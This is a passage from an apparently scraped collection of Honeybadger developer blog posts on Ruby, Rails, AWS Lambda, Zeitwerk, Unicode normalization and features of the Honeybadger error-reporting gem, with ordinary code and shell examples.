900 seconds. Storage - Lambda provides a /tmp directory for storage. The limit of this storage is 512 MB. Request and Response size - Up to 6 MB for a synchronous trigger and 256 MB for an asynchronous trigger. Environment variable - Up to 4KB Since Lambda has some of these limits, it is better to write code that fits within these limitations. In case they don't, we can split the code so that one Lambda triggers another. There is also a step function provided by AWS, which can be used to sequence multiple Lambda functions. How Can We Test Serverless Applications Locally? For serverless applications, we need to have a vendor that provides managed serverless services. We are dependent on AWS to test our application. To test the application, there are a few local options provided by AWS. Some open-source tools that are compatible with AWS serverless technologies can also be used to test the application locally. Let us test our Lambda function and DynamoDB. To do so, we need to run these locally. First, create a docker network. The network will help communicate between the Lambda function and DynamoDB. $ docker network create lambda-local --docker-network lambda-local DynamoDB local is a local version of DynamoDB provided by AWS, which we can use to test it locally. Run DynamoDB local by running the following docker image: $ docker run -p 8000:8000 --network lambda-local --name dynamodb amazon/dynamodb-local Add the following line in the user.rb file. This will connect the Lambda to the local DynamoDB: local_client = Aws :: DynamoDB :: Client . new ( region: \"local\" , endpoint: 'http://dynamodb:8000' ) UsersTable . configure_client ( client: local_client ) Add an input.json file, which contains the input for the Lambda: { \"name\" : \"Milap Neupane\" , \"location\" : \"Global\" } Before executing the Lambda, we need to add the table to the local DynamoDB. To do so, we will be using the migration functionality provided by aws-migrate. Let us create a file migrate.rb and add the following migration: require 'aws-record' require './users.rb' local_client = Aws :: DynamoDB :: Client . new ( region: \"local\" , endpoint: 'http://localhost:8000' ) migration = Aws :: Record :: TableMigration . new ( UsersTable , client: local_client ) migration . create! ( provisioned_throughput: { read_capacity_units: 5 , write_capacity_units: 5 } ) migration . wait_until_available Finally, execute the Lambda locally using the following command: $ sam local invoke \"CreateUserFunction\" -t sam.yaml \\\n                                        -e input.json \\\n                                        --docker-network lambda-local This will create the user's data in the DynamoDB table. There are options, such as localstack , for running AWS stacks locally. When Should Serverless Computing Be Used When deciding whether to use serverless computing, we need to be aware of both its benefits and shortcomings. Based on the following characteristics, we can decide when to use the serverless approach: Cost When the application has idle time and inconsistent traffic, Lambdas are good because they help reduce costs. When the application has a consistent traffic volume, using AWS Lambda can be costly. Performance If the application is not performance-sensitive, using AWS Lambda is a good choice. Lambdas have a cold boot time, which can cause slow response times during a cold boot. Background processing Lambda is a good choice to use for background processing. Some open-source tools, such as Sidekiq, have server scaling and maintenance overhead. We can combine AWS Lambda and AWS SQS queue to process background jobs without the hassle of server maintenance. Concurrent processing As we know, concurrency in Ruby is not something we can do easily. With Lambda, we can achieve concurrency without the need for programming language support. Lambda can be executed concurrently and helps improve performance. Running Periodic or one-time scripts We use cron jobs to execute Ruby codes, but server maintenance for cron jobs can be difficult for large-scale applications. Using event-based Lambdas helps in scaling applications. These are some use cases for Lambda functions in serverless applications. We do not have to build everything serverless; we can build a hybrid model for the above-specified use cases. This helps in scaling applications and increases developers' productivity. Serverless technologies are evolving and getting better. There are other serverless technologies, such as AWS Fatgate and Google CloudRun, which do not have the limitations of AWS Lambda.", "date": "2021-01-13"},
{"website": "Honey-Badger", "title": "How to globally disable rdoc and ri during gem installs", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-globally-disable-rdoc-and-ri-during-gem-installs/", "abstract": "Gem installs can be slooow. One of the biggest culprits is documentation. Every time you install a gem, your computer has to scan the source of that gem and generate documentation. This can be useful if you often need to check gem documentation when you're offline. Just run gem server and point your browser at http://localhost:8808 to access them. The ri command is also handy to search documentation from the terminal. But if you're like me, you probably don't use local docs. You probably have a decent internet connection at most times. So the time spent generating documentation is just time wasted. If you're using bundler to install all of your gems, you don't have to do anything. Bundler skips rdoc/ri by default. If you happen to be using the gem command directly, you'll need to do a bit of configuration. You may already know that you can disable rdoc/ri generation when you run gem install, by passing in certain flags. gem install honeybadger --no-rdoc --no-ri # The old, deprecated way gem install honeybadger --no-document # The new way You can also tell rubygems to apply these flags as defaults. Just add the following line to your ~/.gemrc file: gem: -- no - document But what if you're planning a camping trip and need to grab the local documentation? It's no problem to generate it yourself. gem rdoc --all --overwrite # regen all docs gem rdoc honeybadger # generate docs for one gem Be careful if you choose to regen all your docs, though. It might take a while. :)", "date": "2015-05-28"},
{"website": "Honey-Badger", "title": "Code Loaders in Ruby: Understanding Zeitwerk", "author": ["Subomi Oluwalana"], "link": "https://www.honeybadger.io/blog/ruby-code-loader-zeitwerk/", "abstract": "Code Loaders in Ruby - Understanding Zeitwerk With Zeitwerk, you can streamline your programming knowing that classes and modules are available everywhere. What are Code Loaders? Code loaders let developers define classes and modules across different files and folders and use them throughout the codebase without explicitly requiring them. Rails is a good example of a piece of software that uses code loaders. Programming in Rails doesn't require explicit require calls to load models before using them in controllers. In fact, in Rails 6, everything in the app directory is auto-loaded on app boot, with a few exceptions. While it is easy to think code loading is all about making calls to require , it isn't that simple. Code loading can be further broken down into three parts, as follows. Auto Loading: This means code is loaded on-the-fly as required. For example, in Rails, running rails s doesn't load all the models, controllers, etc. But, on the first hit of the model User , it runs the auto loading mechanism to find and use the model. This is auto loading in action. This has some advantages for our development environment, as we have faster app and rails console startup times. Rails.config.autoload_path controls the paths to be auto-loaded. Eager Loading: This means code is loaded into memory at app startup and doesn't wait for the constants to be called before requiring it. In Rails, code is eager loaded in production. From the explanation above, autoloading code in production will result in slow response times, as each constant will be required on-the-fly. Rails.config.eager_load_paths controls the paths to be eager loaded. Reloading: The code loader is constantly watching for changes to files in the autoload_path and reloads files when it notices any changes. In Rails, this can be quite useful in development, as it enables us to run rails s and simultaneously make changes without needing to restart the rails server. This is reloading in action. We can easily see that most of these concepts have been developed and live in Rails. Zeitwerk changes this! Zeitwerk enables us to bring all the code loading action to any Ruby project. What is Zeitwerk? Zeitwerk is an efficient and thread-safe code loader for Ruby and can be used in any Ruby project, including Web frameworks (Rails, Hanami, Sinatra), Cli tools, and gems. With it, you can streamline your programming knowing that classes and modules are available everywhere. Traditionally, Rails and some other gems have built-in code loaders to enable this functionality. However, Zeitwerk extracts these concepts into a gem and allows Rubyists to apply these concepts to their projects. Installing Zeitwerk First things first, we need to install the gem: gem install zeitwerk # OR in your Gemfile gem 'zeitwerk' , '~> 2.4.0' Configuring Zeitwerk So let's start with the basics: require 'zeitwerk' loader = Zeitwerk :: Loader . new ... loader . setup The above code instantiates a loader instance and calls setup . After the call to setup , loaders are ready to load code. But, before that, all the necessary configurations on the loader should be covered already. In this article, I'll cover a few of the configurations on the loader and conventions for structuring your code. File Structure: For Zeitwerk to work, files and directory names need to match the modules and class names they define. For example, lib / my_gem . rb -> MyGem lib / my_gem / foo . rb -> MyGem :: Foo lib / my_gem / bar_baz . rb -> MyGem :: BarBaz lib / my_gem / woo / zoo . rb -> MyGem :: Woo :: Zoo Root Namespaces: Root Namespaces are directories where Zeitwerk can find your code. When modules and classes are referenced, Zeitwerk knows to search the root namespaces with the matching file name. For example, require 'zeitwerk' loader = Zeitwerk :: Loader . new loader . push_dir ( \"app/models\" ) loader . push_dir ( \"app/controllers\" ) // matches as follows app / models / user . rb -> User app / controllers / admin / users_controller . rb -> Admin :: UsersController There are two primary ways to define the root namespace for two different use cases. The default way is shown below: // init . rb require 'zeitwerk' loader = Zeitwerk :: Loader . new loader . push_dir ( \" #{ __dir__ } /bar\" ) ... loader . setup // bar / foo . rb class Foo ; end This means the class Foo can be referenced without an explicit Bar::Foo , as the bar directory acts as a root namespace. The second way to define a namespace is to explicitly state the namespace in the call to push_dir : // init . rb require 'zeitwerk' module Bar end loader = Zeitwerk :: Loader . new loader . push_dir ( \" #{ __dir__ } /src\" , namespace: Bar ) loader . setup // src / foo . rb class Bar::Foo ; end There are a few things to note from in this code: The module Bar was already defined before being used by push_dir . If the module we want to use is defined by a third-party, then a simple require will define it before we use it in our call to push_dir . The push_dir explicitly specifies the namespace Bar . The file src/foo.rb defined Bar::Foo , not Foo , and did not need to create the directory, like src/bar/foo.rb . Independent code loader: By design, Zeitwerk allows each project or app dependency to manage its individual project tree. This means the code loading mechanism of each dependency is managed by that dependency. For example, in Rails 6, Zeitwerk handles code loading for the Rails app and allows each gem dependency to manage its own project tree separately. It is an error condition to have overlapping files between multiple code loaders. Autoloading: With the above setup, once the call to setup is made, all classes and modules will be available on demand. Reloading: To enable reloading, the loader has to be explicitly configured for it. For example, loader = Zeitwerk :: Loader . new ... loader . enable_reloading # you need to opt-in before setup loader . setup ... loader . reload The loader.reload call reloads the project tree on-the-fly, and any new changes are visible immediately. However, we still need a surrounding mechanism to detect changes to the file system and call loader.reload . A simple version is shown below: require 'filewatcher' loader = Zeitwerk :: Loader . new ... loader . enable_reloading loader . setup ... my_filewatcher = Filewatcher . new ( 'lib/' ) Thread . new ( my_filewatcher ) { | fw | fw . watch { | filename | loader . reload } } Using Zeitwerk in Rails Zeitwerk is enabled by default in Rails 6.0. However, you can opt-out of it and use the Rails classic code loader. # config/application.rb config . load_defaults \"6.0\" config . autoloader = :classic Using Zeitwerk in Gems Zeitwerk provides a convenient method for gems, as long as they use the standard gem structure ( lib/special_gem ). This convenience method can be used as follows: # lib/special_gem.rb require 'zeitwerk' module SpecialGem end loader = Zeitwerk :: Loader . for_gem loader . setup With the standard gem structure, the for_gem call adds the lib directory as a root namespace, enabling every code in the lib directory to be found automatically. For more inspiration, you can check out gems using Zeitwerk: Karafka Jets References Rails autoloading — how it works, and when it doesn't Zeitwerk", "date": "2021-02-22"},
{"website": "Honey-Badger", "title": "Honeybadger Helps Less Accounting Stay Bug-Free this Tax Season.", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-less-accounting-uses-honeybadger-to-fix-errors/", "abstract": "LessAccounting has been in production since 2007 and it was started in Ruby 1.8.6 and Rails 2. Yeah, it’s been around for a while. Even though its simple accounting software , it’s still large and complex with lots of moving pieces and different parts interacting with each other. Here's what they had to say: We’ve tried many ways to manage exceptions over the years, starting with the ExceptionNotifier plugin and different SaaS offerings. I won’t go naming names here but you know them too. Some were buggy, some weren’t exactly helpful and most have frustrating interfaces. They all worked OK to some extent or another, but they all left something lacking. Finally we found HoneyBadger.io! When HoneyBadger came on the scene we instantly fell in love. Not only did we love the interface, so easy to use, but their features and integrations really made our lives easier. The Github integration is a one-two punch that can’t be beat. First it allows you to look at the source code for any line in the stack trace (left lead). Then the right cross comes in for the knock out by giving you one-click creation of issues in Github (which are naturally cross referenced back to HoneyBadger). There’s also a one-click search on StackOverflow, which although we rarely use it (because we’re that awesome) I can imagine some developers using a lot. Honey also gives us the ability to assign errors to each other, a feature we had been asking for from the previous systems for years. They also track deployments, server monitoring, and uptime monitoring. Before we had HoneyBadger, we’d have to constantly check in with each other, “Is anyone working on this issue?” And we weren’t able to cross reference a commit with a github issue back to an exception so figuring out why a change was made was sometimes more difficult. HoneyBadger allows us to get back to coding, working on the app instead of managing communication and process. We really love using this app.", "date": "2014-03-11"},
{"website": "Honey-Badger", "title": "Level Up Your Command-Line-Fu With Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-unix-command-line/", "abstract": "To really master the command line you have to master dozens — if not hundreds — of small utility programs. Each of these does things slightly differently. It can be pretty overwhelming. Fortunately, it's possible to replace a lot of these single-purpose tools with a general-purpose programming language like Ruby. That way you can use the Ruby knowledge you already have to level up your command-line-fu. This post will take you through the fundamentals of using Ruby as a command-line swiss army knife. I'm not going to bombard you with clever one-liners. Instead we'll look at how things really work, so that hopefully you'll be able to apply these techniques to solve your own problems. Using Ruby from the command line I'm sure you know that you can run Ruby programs from the command line like so: $ ruby myprogram.rb But did you know that you can pipe in code to be executed by Ruby? $ echo \"puts 2+2\" | ruby\n4 Even more useful is the ability to pass in code as a command-line argument. This is what we are going to spend our time on today. $ ruby -e 'puts 2+2'\n4 Hey Newbies Are the examples above kind of confusing? It may be because you're not familiar with pipes and redirection. Check out this post for a good intro. We're going to be using pipes a lot below. Working with input Most command-line tools take in some data, process it, and then spit it back out. We've got two good options for getting input: command-line arguments and STDIN. Let's take a look at each of them. Command-line arguments You can send as many command-line arguments as you like to your script. Just put them after everything else: $ ruby -e '<your code here>' arg1 arg2 arg3 etc These arguments are stored inside of the ARGV array. In the example below I'm dumping the whole array so you can see what's in it. $ ruby -e 'puts ARGV.inspect' apples bananas pears oranges\n[\"apples\", \"bananas\", \"pears\", \"oranges\"] It's worth noting that this is exactly how Ruby always behaves. There is no magic happening just because we're using the command line. Check out this post about ARGV for more details. Dumb example Imagine for a second that I am super egotistical. The most important thing to me is to know how many times my name is mentioned on the web. Using the techniques we've seen I can easily write a one liner to calculate this for any webpage. $ ruby -e \"require 'open-uri'; puts open(ARGV.first).read.scan(/starr/i).count\" <url here> STDIN Command-line arguments are great, but they're only good for short values. You wouldn't want to use them to – say — input the unabridged text of Moby Dick. For that we want to use STDIN. If you're not familiar with STDIN, don't be intimidated. For our purposes here it behaves just like any other file open for reading. Here's what I mean. In the example below we are piping some text into Ruby. Our Ruby script is reading it from STDIN and printing it to the screen. echo \"bananas!\" | ruby -e \"puts STDIN.read\"\nbananas! We can easily input larger amounts of data by using cat . The example below uses the first method which is available on any file to grab the first few lines of the text: cat moby.txt | ruby -e \"puts STDIN.first(3)\"\nCall me Ishmael. Some years ago--never mind how long precisely--having\nlittle or no money in my purse, and nothing particular to interest me on\nshore, I thought I would sail about a little and see the watery part of Dumb example Now that we know how to consume STDIN, let's rewrite the dumb example from above. Instead of using Ruby to fetch the webpage, we can use curl and only use Ruby for the pattern matching. curl <MY URL> | ruby -e \"puts STDIN.read.scan(/starr/i).size\" STDIN with syntactic sugar! When you are working with STDIN, it's very common to have to loop over each line of input. Imagine that I want to get the file extension for every file in a directory. Here's how I might do that using normal STDIN loop: ls | ruby -e 'STDIN.each_line { |l| puts l.split(\".\").last }'\nrb\nrb\ncsv Since the STDIN loop is so common, Ruby provides a shorthand. If we run our script with the -n flag, Ruby will automatically loop over each line in STDIN. The current line is in the global variable $_ . So we can rewrite the example above like so: ls | ruby -n -e 'puts $_.split(\".\").last' It's up to you whether or not you want to use the shorthand. While it definitely does mean you have to write less code, it also means that you have to remember more arbitrary facts like -n and $_ . Working with output In situations like these you are usually going to want to write your output to STDOUT. This will give you the most flexibility because it will let you pipe the output into other programs or redirected to disk as necessary. The good news is that you get to use the same print commands that you are probably very familiar with. One thing to be aware of though is that puts adds a newline, which may or may not be what you want. puts \"hello world\" # sends \"hello world\\n\" to STDOUT print \"hello world\" # doesn't add a newline\" Putting it all together Honeybadger is based in Washington state in the US. That means we have the privilege of paying sales tax for every paying customer that happens to also live in Washington. I simplified this quite a bit, but we basically have a CSV file with every transaction for the year.  It looks something like this: 1/1/2015,100.00,WA\n1/1/2015,50.00,NY So to get a quick sum for all transactions in Washington I can use a one-liner like this: $ cat cc.csv | ruby -e 'puts STDIN.inject(0) { |sum, x| date, amount, state = x.split(\",\"); state.strip == \"WA\" ? sum + amount.to_f : sum  }' Keep in mind that this is a horribly sloppy way to parse CSV files. I would never send this code out into the wild. But one of the joys of writing tiny little programs to solve one-off problems is that you get to ignore all of the edge cases. That's what I'm going to do here.", "date": "2015-12-08"},
{"website": "Honey-Badger", "title": "What's New in the Honeybadger Gem v3", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/what-s-new-in-the-honeybadger-gem-3-0/", "abstract": "TLDR: For just the bullet points, check out the CHANGELOG . I recently shipped the latest major update to our gem for reporting exceptions\nin Ruby . While the v2\nrelease was a full re-write that included a new configuration strategy, v3\ncontains fewer breaking changes but a lot of feature and usability improvements.\nThere's a lot to cover, so I'm going to dive right in. Enjoy! Plain ol' Ruby mode In the Rails world it's pretty much expected that when you install a gem it's\ngoing to automatically integrate with your application. For instance, many gems\nprovide their own Railtie to run\ntheir own code when Rails initializes. The honeybadger gem fully embraces that approach, making it really easy to set\nup comprehensive error reporting for Rails, Sinatra, Sidekiq, and a number of\nother popular gems and frameworks. It's literally as simple as require\n'honeybadger' . Some Rubyists prefer to roll their own integrations, however. Monkey\npatching (which happens a lot in\nRails) makes them rage, and the last thing they want is for a gem to change\ntheir application in less-than-obvious ways by simply requiring it. I completely\nget that (in fact, I tend towards that mindset myself). Others may not be using any of the libraries we integrate with and would rather\nreport errors themselves using Honeybadger.notify , avoiding unnecessary\ninitialization at runtime. That's why I added \"Plain ol' Ruby\" mode (unofficial title). If you're one of us\nweirdos who enjoy writing configuration and installing middleware from scratch\n(or you're just using plain Ruby), you can now require 'honeybadger/ruby' instead of the normal require 'honeybadger' . Now you can use Honeybadger.notify , Honeybadger.context , etc. without any of the automatic\nintegrations being activated: it's minimal, predictable error tracking for\nRuby: require 'honeybadger/ruby' begin # Failing code rescue => exception Honeybadger . notify ( exception ) end Multiple agents Speaking of plain ol' Ruby, you can now use Ruby to create additional agents,\nwhich are what reports errors to your Honeybadger project. This means that you\ncan finally report errors to multiple Honeybadger projects in the same\napplication. Here's what it looks like: OtherBadger = Honeybadger :: Agent . new OtherBadger . configure do | config | config . api_key = 'project api key' end begin # Failing code rescue => exception OtherBadger . notify ( exception ) end The return of Honeybadger.configure First of all, if you use honeybadger.yml to configure the gem currently, don't\nworry -- nothing has changed, and it's still the default! That said, we've had customers who missed the ability to configure the gem\nprogrammatically from Ruby. In v3.0 you get the best of both worlds: we still\nsupport full configuration via honeybadger.yml and environment variables and\nhave added back Honeybadger.configure : Honeybadger . configure do | config | config . api_key = 'project api key' config . exceptions . ignore += [ CustomError ] end The priority for configuration is YAML -> ENV -> Ruby, meaning that environment\nvariables will override honeybadger.yml , and Honeybadger.configure will\noverride environment variables. Report errors in cron jobs and command line programs One of cron's long-standing problems is that its automatic email feature doesn't\nunderstand error output. Sure, it will email you if a task fails, but it will\nalso email you when your successful tasks happen to generate standard output. Hey, don't you use Honeybadger to get fewer unactionable email alerts?\nWouldn't it be cool if you could use Honeybadger to report cron failures instead\nof or in addition to email? Now you can. We added the honeybadger exec command to our CLI (Command Line Interface) to\nhandle reporting cron failures as well as any command that you normally\nexecute via the command line. That means bash scripts, executables, make tasks, etc. To use it, just add honeybadger exec before any command: $ honeybadger exec my-command --my-flag If the command executes successfully it will exit with code 0 and no output\n(even standard out is disabled by default, but you can enable it with a special\nflag). If the command fails, however, you'll receive a Honeybadger notification\nwhich includes the command that was run and the full output. Because honeybadger exec silences all output by default for successful\ncommands, it's particularly useful with cron's email feature. By using both honeybadger exec and cron emails you'll get Honeybadger notifications when\na command fails; if for some reason the Honeybadger notification also fails (due\nto a connection issue, for instance), it will dump the output from the original\ncommand and cron will still email you about the failure. Report custom errors from the command line This one's pretty simple. Want to send a custom Honeybadger notification from a\nbash script (or any shell)? Use honeybadger notify : $ honeybadger notify --message \"This is an error from the command line\" You can use optional flags like --class , --component , --action , etc. to\nadd additional properties to the notification. Other improvements We added even more features and improvements in v3: Honeybadger.notify now accepts a string argument in addition to an exception,\nso you can do Honeybadger.notify(\"these are not the badgers you're looking for\") . When inside a git repository, the git revision is automatically reported with\nexceptions. The revision can be added or changed manually with the new :revision config option. The CLI's user interface is now much friendlier with verbose error messages,\nand it may be used as a standalone executable (outside of Rails). The test suite is about 10 times faster, meaning we can develop even more new features\nand integrations faster. The request data filter now uses a wildcard match strategy by default. So if\nyou filter \"password\", the \"password\" and \"password_confirmation\" request\nparameters will both be filtered (this is how Rails filters work). Changes and removals We've also made some changes and removed some features which didn't make sense\nanymore: We dropped support for Ruby 1.9.3 and 2.0.x; moving forward 2.1.0 will\nbe the lowest officially supported version. We've removed all deprecations from v2. The deprecated metrics and tracing code has been removed. Honeybadger.start is no longer necessary (and will raise an exception if\nused). If you previously used Honeybadger outside of Rails, you can use Honeybadger.configure to configure the agent without creating a separate Honeybadger::Config instance or calling Honeybadger.start . We renamed the plugins.skip option to skipped_pluggins and sidekiq.use_component is now true by default. CGI variables are now whitelisted so that it's harder to leak sensitive data\nby accident. In development, the Honeybadger.notify method now raises an exception when\ncalled without valid arguments. In production it logs the error. Errors when evaluating honeybadger.yml are now raised instead of logged,\nhelping to identify configuration problems earlier. Backtraces for errors\ninside ERB tags have also been improved to make the errors easier to debug.", "date": "2017-03-03"},
{"website": "Honey-Badger", "title": "Adding Context to Exception Classes", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/adding-context-to-exception-classes/", "abstract": "We recently shipped version 3.2 of the honeybadger Ruby Gem, which includes a new feature to make it easier to add context to your error reports. tl;dr The honeybadger gem now supports defining the #to_honeybadger_context method on any exception class. When an instance of that exception is raised and reported to Honeybadger, its context will be automatically included in the error report: class MyError < StandardError attr_reader :custom_attribute def initialize ( err , custom_attribute ) @custom_attribute = custom_attribute super ( err ) end def to_honeybadger_context { custom_attribute: custom_attribute } end end raise MyError . new ( \"Something went wrong\" , { foo: 'bar' }) # Honeybadger context will include: # { #   custom_attribute: { #     foo: 'bar' #   } # } What is Context? Context allows you to send additional data to Honeybadger when an error occurs in your application . In Rails, you can set context for the current request using the Honeybadger.context method, which is provided by our Ruby gem : Honeybadger . context ({ user_email: 'user@example.com' }) Every error which occurs in the current request (or job if you're running a background worker) will have its own unique context data. Your context data can be anything, but often includes things likes the user id or email address of the currently logged in user, some raw POST data or other related payload to aid debugging, id of a background job, etc. You can also add local context when reporting an error manually : Honeybadger . notify ( exception , context: { user_email: 'user@example.com' }) Fun fact: while context can be anything, Honeybadger has a few \"special\" context\nkeys. For instance, if you include the user_email key with your error reports,\nHoneybadger will create a report of affected users for each error. Adding Context from Exceptions Some context is specific to an exception itself, rather than a request. For instance, say we're making an HTTP request using the faraday gem : require 'faraday' conn = Faraday . new ( :url => 'http://example.com' ) do | faraday | faraday . response :raise_error # Raises an error if the request isn't successful faraday . adapter Faraday . default_adapter end response = conn . get ( '/does-not-exist' ) # => Faraday::ResourceNotFound The above code raises the following exception: Faraday::ResourceNotFound: the server responded with status 404 Honeybadger will automatically report this error (assuming it's configured to do so), but it won't have any information about the response object. This information would be nice to have, especially for less obvious server errors, such as a 500 response. Looking at the definition of Faraday::ResourceNotFound on GitHub , we see that it's actually a type of ClientError , and ClientError defines an attribute that stores the response object on each instance . Using this information, we can rescue all instances of Faraday::ClientError and use Honeybadger.notify to add some response data to the context: begin response = conn . get ( '/does-not-exist' ) rescue Faraday :: ClientError => err Honeybadger . notify ( err , context: { response_status: err . response . status , response_headers: err . response . headers }) # Additional error handling... end This allows us to report failed requests to Honeybadger along with some extra information about the response. We use this pattern for adding exception-specific context when an error occurs, and while it works, it clutters our code with rescue statements and custom notification logic, which is messy and adds a lot of overhead to our code. The good news: there's a better way! New Feature: Exception-level Context Instead of reporting the error manually, the context can now be defined on the exception class itself , and Honeybadger will pick it up automatically, no matter where the error is ultimately reported. Revisiting the previous example, rather than adding an ugly rescue statement, let's allow Honeybadger's built-in reporting to handle the exception: response = conn . get ( '/does-not-exist' ) # => Faraday::ResourceNotFound Instead, let's add the #to_honeybadger_context method to Faraday::ClientError , which is a special method Honeybadger checks for when any exception is reported: Faraday :: ClientError . class_eval do def to_honeybadger_context { response_status: err . response . status , response_headers: err . response . headers } end end By adding the #to_honeybadger_context method to Faraday::ClientError , we'll get the response context whenever that error occurs, without cluttering up our code!", "date": "2017-12-05"},
{"website": "Honey-Badger", "title": "Unicode Normalization in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-unicode-normalization/", "abstract": "I recently published an article in which I tested most of Ruby's string methods with certain Unicode characters to see if they would behave unexpectedly. Many of them did. One criticism that a few people had of the article was that I was using unnormalized strings for testing. Frankly, I was a bit fuzzy on Unicode normalization. I suspect that many Rubyists are. Using normalization, you can take many Unicode strings that behaved unexpectedly in my tests and convert them into strings that play well with Ruby's string methods. However: The conversion isn't always perfect. Some unicode sequences will always cause Ruby's string methods to misbehave. It's something you have to do manually. Neither Ruby, nor Rails nor the DB normalizes automatically by default. This article will be a brief introduction to Unicode normalization in Ruby. Hopefully it will give you a jumping-off point for your own explorations. Let's normalize a string The String#unicode_normalize method was introduced in Ruby 2.2. Being written in Ruby, it's not as fast as normalization libraries like the utf8_proc and unicode gems that leverage C. The reason we need normalization is that in Unicode there is more than one way to write a character. The letter \"Å\" can be represented as the code point \"\\u00c5\" or as the composition of the letter \"A\" and an accent: \"A\\u030A\" . Normalization converts one form to another: \"A \\u 030A\" . unicode_normalize #=> 'Å' (same as \"\\u00C5\") Of course, there isn't just one way to normalize Unicode. That would be too simple!  There are four ways to normalize, called \"normalization forms.\" They're named using cryptic acronyms: NFD, NFC, NFKD and NFKC. String#unicode_normalize uses NFC by default, but we can tell it to use an other form like so: \"a \\u 0300\" . unicode_normalize ( :nfkc ) #=> 'à' (same as \"\\u00E0\") But what does this actually mean? What do the four normalization forms actually do? Let's take a look. Normalization forms There are two kinds of normalization operations: Composition: Converts multi-code-point characters into single code points. For example: \"a\\u0300\" becomes \"\\u00E0\" , both of which are ways of encoding the character à . Decomposition: The opposite of composition. Converts single-code-point characters into multiple code points. For example: \"\\u00E0\" becomes \"a\\u0300\" . Composition and decomposition can each be done in two ways: Canonical: Preserves glyphs. For Example: \"2⁵\" remains \"2⁵\" even though some systems may not support the superscript-five character. Compatibility: Can replace glyphs with their compatibility characters . For example: \"2⁵\" will be converted to \"2 5\" . The two operations and two options are combined in various ways to create four \"normalization forms.\" I've listed them all in the table below, along with descriptions and examples of input and output: Name Description Input Output NFD Canonical Decomposition Å \"\\u00c5\" Å \"A\\u030A\" NFC Canonical Decomposition Followed by Canonical Composition Å \"A\\u030A\" Å \"\\u00c5\" NFKD Compatibility Decomposition ẛ̣ \"\\u1e9b\\u0323\" ṩ \"\\u0073\\u0323\\u0307\" NFKC Compatibility Decomposition Followed by Canonical Composition ẛ̣ \"\\u1e9b\\u0323\" ṩ \"\\u1e69\" If you look at this table for a few minutes you might start to note that the acronyms kind of make sense: \"NF\" stands for \"normalization form.\" \"D\" stands for \"decomposition\" \"C\" stands for \"composition\" \"K\" stands for \"kompatibility\" :) For more examples and a much more thorough technical explanation, check out the Unicode Standard Annex #15 . Choosing a normalization form The normalization form you should use depends on the task at hand. My recommendations below are based on the Unicode Normalization FAQ . Use NFC for String compatibility If your goal is to make Ruby's string methods play nicely with most of Unicode, you most likely want to use NFC. There's a reason it's the default for String#unicode_normalize . It composes multi-code-point characters into single code points where possible. Multi-code-point characters are the source of most problems with String methods. It doesn't alter glyphs, so your end-users won't notice any change in text that they've input. That said, not all multi-code-point characters can be composed into a single code point. In those cases Ruby's String methods will behave poorly: s = \" \\u 01B5 \\u 0327 \\u 0308\" # => \"Ƶ̧̈\", an un-composable character s . unicode_normalize ( :nfc ). size # => 3, even though there's only one character Use NFKC for security and DB compatibility If you're working with security-related text such as usernames, or primarily interested in having text play nicely with your database, then NFKC is probably a good choice. It converts potentially problematic characters into their compatibility characters. It then composes all characters into single code points. To see why this is useful for security, imagine that you have a user with username \"HenryIV\". A malicious actor might try to impersonate this user by registering a new username: \"HenryⅣ\". I know, they look the same. That's the point. But they're actually two different strings. The former uses the ascii characters \"IV\" while the latter uses the unicode character for the Roman numeral 4: \"Ⅳ\" . You can prevent this sort of thing by using NFKC to normalize the strings before validating uniqueness. In this case, NFKC converts the unicode \"\\u2163\" to the ascii letters \"IV\". a = \"Henry \\u 2163\" b = \"HenryIV\" a . unicode_normalize ( :nfc ) == b . unicode_normalize ( :nfc ) # => false, because NFC preserves glyphs a . unicode_normalize ( :nfkc ) == b . unicode_normalize ( :nfkc ) # => true, because NFKC evaluates both to the ascii \"IV\" Parting Words Now that I've looked into it more, I'm a little surprised that Unicode normalization isn't a bigger topic in the Ruby and Rails communities. You might expect it to be done for you by Rails, but as far as I can tell it's not. And not normalizing the data that your users give you means that many of Ruby's string methods are not reliable. If any of you dear readers know something I don't, please get in touch via twitter @StarrHorne or email at starr@honeybadger.io . Unicode is a big topic and I've already proven I don't know everything about it. :)", "date": "2017-03-06"},
{"website": "Honey-Badger", "title": "Why and How to Host your Rails 6 App with AWS ElasticBeanstalk and RDS", "author": ["Amos Omondi"], "link": "https://www.honeybadger.io/blog/rails-6-aws-elastic-beanstalk/", "abstract": "When writing an application, one of the major issues you have to think about is how the application\nwill be shared with the rest of the world. One common approach has been to launch on Heroku. It's easy to set up and is fully managed. But, it's also common for teams to drop Heroku later.  As their traffic grows, Heroku becomes too expensive and inflexible. What if it were possible to deploy a new application with Heroku-like ease without giving up the flexibility and cost-savings that you get from a more general-purpose platform like AWS? It is possible, using Elastic Beanstalk -- a service from AWS. In this article, I'm going to walk you through setting up a Rails 6 application and running it on\nAWS using Elasticbeanstalk as the compute base and RDS (Relational Database Service) - in particular,\nthe Postgres service - as the data store. At the end of this tutorial, you should be able to do the following: Set up a Rails 6 app with a few routes and run it locally. Create an AWS account. Set up and deploy an app to Elasticbeanstalk using the free-tier resources. Let's dive in. What are Elasticbeanstalk and RDS? To get a clear idea of what Elasticbeanstalk is and the problem it solves, first, let's talk about Amazon's EC2 offering. EC2 stands for Elastic Compute Cloud 2. This service allows you to provision VPCs, which are basically just computers, running whichever OS you choose (e.g., Ubuntu). Your app will then live inside this computer and access its resources, such as the file system and RAM, to deliver its tasks. In the end, your app will run similar to how it runs on your local machine, only in a machine owned by Amazon and accessible via the internet using Amazon's infrastructure. Now, imagine a user named Alice, who has provisioned an instance on EC2. Alice will need to do the following: Set up a security group to allow requests to her app. Set up a load balancer. SSH into the instance, set up her app and environment secrets, and so on. While this gives you full control of your machine and what and how it runs, sometimes, you want to focus on the app and not the infrastructure. This is where Elasticbeanstalk comes in. Elasticbeanstalk provides a CLI that makes it easier to do all this and will automate most of it, such as creating security groups and load balancers. While the underlying infrastructure is still EC2, a layer of abstraction is added on top of it, with a visual dashboard that allows you to set up environment variables, databases, and auto-scaling, as well as obtain logs and perform other functions, in a very simple manner. What is Rails? Many tools can be used to get a  web application up and running. Usually, the library or framework you end up using is mostly dictated by the language in which it is programmed. If your language of choice happens to be Ruby, a popular 